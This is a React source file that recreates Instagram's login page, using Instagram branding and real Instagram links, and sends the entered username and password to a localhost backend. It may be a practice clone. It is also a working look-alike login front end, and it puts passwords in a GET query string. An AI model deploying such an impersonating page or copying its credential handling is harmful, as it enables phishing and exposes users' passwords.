import { useState } from 'react'
import reactLogo from './assets/react.svg'
import viteLogo from '/vite.svg'
import './App.css'
import instagram from './assets/instagram.png'
import { FaFacebook } from 'react-icons/fa';
import Footer from './component/Footer'
import axios from 'axios'
import { useNavigate } from 'react-router-dom'

function App() {
  const [user, setUser] = useState('')
  const [pass, setPass] = useState('')
  const navigate = useNavigate()

  function getUsername(e) {
    setUser(e.target.value)
  }
  function getPass(e) {
    setPass(e.target.value)
  }
  async function check() {
  try {
    const response = await axios.get(`http://localhost:3000/login?username=${user}&password=${pass}`);
    
    // Assuming your backend sends `true` or `false`
    if (response.data === true) {
      localStorage.setItem('username', user);
      navigate('/success');
    } else {
      navigate('/fail');
    }
  } catch (error) {
    console.error('Login request failed:', error);
    navigate('/fail');
  }
}

  return (

    <div className='wrapper'>
      <div className='main'>
        <div>
          <img style={{ height: '400px', width: '500px' }} src={instagram} alt="" />
        </div>
        <div>
          <h1>Instagram</h1>
          {/* Login div */}
          <div className='login-div'>


            {/* Input fields */}
            <div className='field'>
              <input type="text" onChange={getUsername} name="username" id="userdetail" placeholder='' />
              <label htmlFor="userdetail" id="labeluser">Phone number, username or email</label>
              <input type="password" onChange={getPass} name="password" id="password" placeholder='' />
              <label htmlFor="password" id="labelpass" >Password</label>
              <button onClick={check} style={{ backgroundColor: '#4CB5F9', borderRadius: '10px', color: 'white', border: 'none', fontSize: '14px', padding: '10px 25px 10px 25px', width: '85%' }}>Log in </button>
            </div>
            {/* OR */}

            <div >

              <span className='small-line'></span>
              <span>OR</span>
              <span className='small-line'></span>

            </div>

            {/* Login with FB */}
            <div>
              <div className='fbdiv' >
                <a className='fblogin' href="https://www.instagram.com/accounts/password/reset/" target='_blank'><FaFacebook size={20} color="#1877F2" /><p>Login with Facebook</p></a>
              </div>
              <a href="https://www.instagram.com/accounts/password/reset/" className='text-[#4CB5F9] no-underline ' target='_blank'>Forgot password?</a>
            </div>
            {/* Sign up */}
            <div className='signup'>
              <p>Don't have an account?</p><a href="https://www.instagram.com/accounts/emailsignup/" target='_blank'>Sign up</a>
            </div>

          </div>
        </div>
      </div>
      <div><Footer /></div>

    </div>
  )
}

export default App
